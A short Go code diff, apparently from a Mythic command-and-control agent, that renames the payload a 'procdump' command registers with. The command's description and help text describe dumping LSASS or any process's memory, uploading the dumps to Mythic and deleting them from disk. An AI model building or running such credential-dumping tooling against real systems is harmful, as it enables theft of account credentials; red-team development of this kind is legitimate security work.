@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "procdump",
 		Description:         "Dump process memory to a minidump file using MiniDumpWriteDump. Supports automatic LSASS discovery or dumping any process by PID. Dumps are uploaded to Mythic and cleaned from disk.",
 		HelpString:          "procdump\nprocdump -action lsass\nprocdump -action dump -pid 1234",
